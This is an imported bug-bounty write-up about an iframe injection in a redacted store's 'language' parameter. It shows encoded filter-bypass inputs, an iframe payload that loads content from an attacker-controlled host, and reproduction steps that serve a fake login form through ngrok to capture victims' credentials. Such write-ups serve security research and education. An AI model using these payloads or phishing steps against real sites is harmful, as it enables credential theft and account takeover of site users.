---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-05-29_account-takeover-via-iframe-injection.md
original_filename: 2021-05-29_account-takeover-via-iframe-injection.md
title: Account Takeover via iFrame Injection
category: documents
detected_topics:
- xss
- command-injection
- automation-abuse
- api-security
tags:
- imported
- documents
- xss
- command-injection
- automation-abuse
- api-security
language: en
raw_sha256: fe726aca2042da20fc343b6cc6f8f9f8289a7b59fd5a1efbc4fabdca4de32537
text_sha256: b71d38aef384f574239bbcc6a4fa5ea7ea510fd05320a0eeb3dd293eabc6dcf2
ingested_at: '2026-06-28T07:32:06Z'
sensitivity: unknown
redactions_applied: false
---

# Account Takeover via iFrame Injection

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-05-29_account-takeover-via-iframe-injection.md
- Source Type: markdown
- Detected Topics: xss, command-injection, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:06Z
- Redactions Applied: False
- Raw SHA256: `fe726aca2042da20fc343b6cc6f8f9f8289a7b59fd5a1efbc4fabdca4de32537`
- Text SHA256: `b71d38aef384f574239bbcc6a4fa5ea7ea510fd05320a0eeb3dd293eabc6dcf2`


## Content

---
title: "Account Takeover via iFrame Injection"
page_title: "Blog/writeup/account-takeover-via-iframe-injection.md at main · xbforce/Blog · GitHub"
url: "https://github.com/xbforce/Blog/blob/main/writeup/account-takeover-via-iframe-injection.md"
final_url: "https://github.com/xbforce/Blog/blob/main/writeup/account-takeover-via-iframe-injection.md"
authors: ["xbforce (@xbforce)"]
bugs: ["Iframe injection", "Account takeover"]
publication_date: "2021-05-29"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3615
---

[![Twitter](https://camo.githubusercontent.com/814dd78af4be49ef8c5d3e2b7825799f9482b57f1bdecb14f00322df0f2630bb/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f747769747465722532302d2532333144413146322e7376673f267374796c653d666f722d7468652d6261646765266c6f676f3d54776974746572266c6f676f436f6c6f723d7768697465266c6162656c3d466f6c6c6f772532302534307862666f726365)](https://twitter.com/xbforce) [![Youtube](https://camo.githubusercontent.com/40fbb23de812f3e47b676bcdc05a7220e52949b7feaf3a9696e9c4a01e8c978b/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f596f75747562652532302d2532334646303030302e7376673f267374796c653d666f722d7468652d6261646765266c6f676f3d596f7554756265266c6f676f436f6c6f723d7768697465266c6162656c3d537562736372696265)](http://www.youtube.com/channel/UCadRCMA7BFJ2iwiABKqf0Fg?sub_confirmation=1)

## Account Takeover via iFrame Injection
  
  
  Vulnerable URL: https://store.redacted.com/
  Vulnerable Parameter: language=
  

Sometimes you find an XSS vulnerability on a target domain but you cannot inject your javascript codes because the target sanitizes payloads perfectly using black/white lists or stop them from doing their malicious jobs by using WAFs, but there are always different ways to bypass defending mechanisms, and it is only the matter of time and efforts.

Some months ago I was looking for bugs on a very big company’s subdomains, and found nothing after trying different techniques to takeover accounts for four days. Usually if there is a login system and I can signup on the target website I go for account takeover first. I did the same on this target but I wasn’t able to find any way to takeover accounts simply because the company’s security team did its job really great to block all ways to takeover accounts.

After trying account takeover I decided to look for XSS so maybe I can takeover accounts indirectly via an XSS vulnerability. When I work on a target I always run burpsuite first and capture all traffic with this amazing tool. If I need parameters I go to `Target` TAB and on the `Sitemap` TAB I look at `Contents` section, then prioritize URLs based on `Params`. This is because burpsuite scanner finds some URLs with parameters and if you are only looking for URLs on the `history` TAB you may miss some golden ones.

So I tested URLs and tried different techniques manually to get an XSS, but there wasn’t any success. Finally I picked another address which looked like this:
  
  
  https://store.redacted.com/some/dir/store/index.jsp?c=subscribe
  

I changed the value of the above parameter but nothing reflected on the response page. I noticed that other subdomains have a common parameter in their addresses which is `language=`, however I wasn’t able to get XSS from this parameter on the other subdomains but I decided to give it a try and add this parameter to the targeted URL:
  
  
  https://store.redacted.com/some/dir/store/index.jsp?language=PAYLOADS&c=subscribe
  

**How did I bypass the restrictions?**

I Hardly ever throw `ready to use payloads` to my targets, instead, I try to bypass special characters manually by using different characters and different techniques and make a note of them if characters make any change to the special characters or the URL in total:
  
  
  ?language=%25%322
  
  ?language=%%32%32
  
  ?language=%%2522
  
  ?language=%00%25%00%32%00%32
  
  ?language=%21%22%3c
  
  ?language=%40%22%3c
  
  ?language=%5c%22%3c
  
  etc
  

After trying many characters I finally found the golden char which was `%7b` which is an open curly bracket `{`.
  
  
  https://store.redacted.com/some/dir/store/index.jsp?language=%7b%22%3exbforce&c=subscribe
  

[![response](https://github.com/xbforce/Blog/raw/main/images/account-takeover-via-iframe-injection/02-escape.png)](https://github.com/xbforce/Blog/blob/main/images/account-takeover-via-iframe-injection/02-escape.png)

  
  

[![escape-url](https://github.com/xbforce/Blog/raw/main/images/account-takeover-via-iframe-injection/03-escape_url.png)](https://github.com/xbforce/Blog/blob/main/images/account-takeover-via-iframe-injection/03-escape_url.png)

On some targets you are done when you bypass restrictions and you can inject your payload and execute it easly, but on some other targets like the one that I worked on, it is just the first step of struggles and you have to find a way to bypass other restrictions too.

I injected different javascript and html tags and events but all of them were blocked and I couldn’t execute any XSS payload except `iframe` and `src` (only if it is inside the iframe tag). Next step was trying to cover the original page with my iframe and its contents, but unfortunately it wasn’t possible and I don’t know why the different values on `position=`, `width=` and `height=` didn’t work. The only effective values that worked for me were:
  
  
  {“><iframe src="https://attacker-server.com/" position="fixed" width="100%" height="100%"></iframe>
  

This way I could make a banner at the top of the vulnerable page and show something like login or credit card forms there.

As the website allowed its customers to save their credit card info in their accounts and of course the accounts contained Private Information of the users like `email address, phone number, home address, credit card info etc`, I decided to create a form with a deceitful gift within the iframe to show that I can capture the victims’ credentials.

[![login-form](https://github.com/xbforce/Blog/raw/main/images/account-takeover-via-iframe-injection/04-login-method1.png)](https://github.com/xbforce/Blog/blob/main/images/account-takeover-via-iframe-injection/04-login-method1.png)

I also created another page to redirect the victims after submitting the form so that victims get the unfortunate message.

[![unfortunate-message](https://github.com/xbforce/Blog/raw/main/images/account-takeover-via-iframe-injection/05-unfortune-method1.png)](https://github.com/xbforce/Blog/blob/main/images/account-takeover-via-iframe-injection/05-unfortune-method1.png)

Finally to show how the vulnerability can be exploited I ran my tools and recorded a POC video as well as writing a report containing screenshots.

**Tools**

Ngrok – An easy to use server Python SimpleHTTPServer.

**Steps to reproduce the exploit**

  * Create an index.html file with a form to get username and password of the victim, and redirect them to `done.html`.

  * Create another file named `done.html` to show the unfortunate message.

  * Make a directory and copy the `index.html`, `done.html` and the `logo` file of the target to the directory.

  * Run both tools in the same directory where the files are located.

`$ ngrok http 58700`

`$ python -m SimpleHTTPServer 58700`

! Both tools should have the same port number !

  * Open the malicious URL as a victim and submit the form.

  
  
  https://store.redacted.com/some/dir/store/index.jsp?language={"><iframe src="https://83c2c8cabcbd.ngrok.io/" position="fixed" width="100%" height="100%" width="inherit" height="inherit" margin="-5" padding="-5"></iframe>&c=subscribe
  

  * Check the captured credentials in python SimpleHTTPServer:

[![credentials](https://github.com/xbforce/Blog/raw/main/images/account-takeover-via-iframe-injection/06-creds-method1.png)](https://github.com/xbforce/Blog/blob/main/images/account-takeover-via-iframe-injection/06-creds-method1.png)

### To support me you can buy Hacking courses through my voucher:

💰 <https://store.7asecurity.com/discount/97C9-28DB-5815-44EE>

### Or donate through the following links:

💰 <https://paypal.me/pools/c/8pL97bLm3r>

💰 <https://www.buymeacoffee.com/xbforce>
